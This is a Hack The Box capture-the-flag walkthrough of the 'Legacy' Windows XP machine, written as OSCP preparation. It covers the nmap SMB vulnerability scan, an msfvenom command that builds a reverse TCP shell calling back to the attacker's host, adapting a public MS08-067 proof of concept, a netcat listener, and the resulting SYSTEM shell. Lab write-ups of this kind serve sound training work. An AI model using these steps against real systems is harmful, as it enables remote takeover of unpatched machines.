---
title: 'HTB: Legacy'
author: Nullprism
date: 2021-08-03 22:10:00 -0500
categories: [HTB, Windows]
tags: [oscp-like, oscp prep, writeup, walkthrough, legacy, windows, smb, ms08-067, msfvenom, ctf, hackthebox, htb, reconnoitre, 2to3]
image:
  src: /assets/img/htb/legacy/legacy_title_card.png
  width: 500   # in pixels
  height: 200   # in pixels
  alt: Legacy Title Card
---
## Intro

So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comfortable on Linux than I do Windows, so I'm going to start doing all the Windows ones first.


## Initial Engagement & Enumeration

Started with a general reconnaissance and services scan via [reconnoitre](https://github.com/codingo/Reconnoitre). I'd actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I've used it a lot since then, and I'm thrilled its in play for OSCP. [Codingo](https://twitter.com/codingo_) did an excellent job with it. Its full capabilities won't likely be seen on this box, as the enumeration path is pretty straightforward, but it'll show its value later on, I have no doubt.

### Reconnoitre

```bash
reconnoitre -t 10.129.192.174 -o . --services
```

### Scan Results

![Scan Results](/assets/img/htb/legacy/legacy_scan_results.png)

Initial scan reveals the box to be:
- Hostname: Legacy
- Windows XP (2000 Lan Manager)
- Likely on SMBv2

## Enumeration

### Initial Assessment
Port 445 is open. Given the OS version and likely patch level of the OS, and lack of other open services, SMB is likely fertile ground for an exploitation vector to gain a foothold on this box. Let's execute some vulnerability scanning functionality within nmap to see if we can find a viable pathway.

### Using NMAP to check for SMB Vulnerabilities
```bash
# I recoommend running this with root privileges, so if you aren't root, sudo
nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.129.192.174
```

Vulnerability scans return two intersting findings: [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067), and [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).

```
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

## Exploitation

### Finding an Exploit
I generally believe in following the path of least resistance whenever possible, and ```MS08-67``` is one of the more famous exploits. I think everyone in the world uses jovoi's POC of the exploit, found on their GitHub [here](https://github.com/jivoi/pentest). Considering the age of the POC against our current Attack Platform version (Kali 2021.1 at the time of this article), we will likely need to do some python2 and python3 juggling. I'll link my finalized exploit code later on.

Reading through the POC, we will need to generate our own unique reverse shell payload. I prefer reverse shells whenever possible, as target firewalls are generally more permissive outbound, than inbound (less logging generally, too).

### Generating Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows
```

Thankfully the POC is well documented for what it wants for shellcode, but to break this down a bit:
- Windows Reverse TCP shell payload
- Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)
- If the shell exits, keep the program running (hence the thread)
- Give it to me in Python format (saves you time reformatting)
- x86 architecture

![Shellcode Generation](/assets/img/htb/legacy/legacy_shellcode_gen.png)

### Some SC Generation Quirks
I did screw up and forget to pass the ```-v``` flag, allowing me to rename the buf variable to shellcode. So I reran ```msfvenom``` but I didn't take a new screenshot. 

### Converting from Python2 to Python3
After inserting the new shellcode, I *really* didn't feel like dealing with python2 dependencies, so I converted the python2 syntax of the POC to python3 with [2to3](https://docs.python.org/3/library/2to3.html).

```bash
2to3 -w MS08-067.py
```

### Finalizing the Code
With the code patched the have relevant shellcode, and migrated from python2 to python3, it's ready to execute. If you are looking for my finalized exploit code for MS08-67, it is hosted on my github [here](https://github.com/nullprism/htb-boxes/tree/main/legacy).

### Executing the Exploit

Executing the script yields some help and targeting context:
```
Usage: MS08-067.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

FYI: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

Based on the output, I'm pretty sure that script by nmap was run in our catch all earlier, but I'll double check.

```bash
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.129.192.174 -Pn
```
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 21:14 CDT
Nmap scan report for 10.129.192.174
Host is up (0.053s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-08-09T07:12:11+03:00
```

### Selecting a Target Framework

It was. So my target options here are 1, 5, 6, 7. I feel safe in ruling out the French language pack (#5), and the AlwaysOn option (#7). I typically shy away from Universal options, so let's try 6 first, and if that fails, we can try 1. 

### Setting Up a Listener
First, let's set up our catcher:

```bash
nc -lnvp 4443
```

### Shell
After a VPN output mid-exploit, forcing me to reconnect and reset the box, success.

![Shell Callback](/assets/img/htb/legacy/legacy_shell_callback.png)

## Post-Exploitation

### Entry
```cmd
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>echo %computername%\%username%
echo %computername%\%username%
LEGACY\%username%

C:\WINDOWS\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

        Connection-specific DNS Suffix  . : .htb
        IP Address. . . . . . . . . . . . : 10.129.192.181
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . : 10.129.0.1

C:\WINDOWS\system32>
```

### Legacy OS Quirks
You can be like me and forget you are on Windows XP, it is old after all, and type ```whoami```. It doesn't exist on XP. I was able to enumerate the host name, but not the username with system variables in the cmd shell. After some research, I discovered you could pull ```whoami.exe``` onto the box if you really needed to know which user you are, but its well-documented that this exploit lands you as **NT AUTHORITY\SYSTEM**. 

### Privilege Escalation
Long story, short; we don't need to bother with privilege escalation. We can go straight for the flags.

### Flags
![User Flag](/assets/img/htb/legacy/legacy_user_flag.png)

![Root Flag](/assets/img/htb/legacy/legacy_root_flag.png)
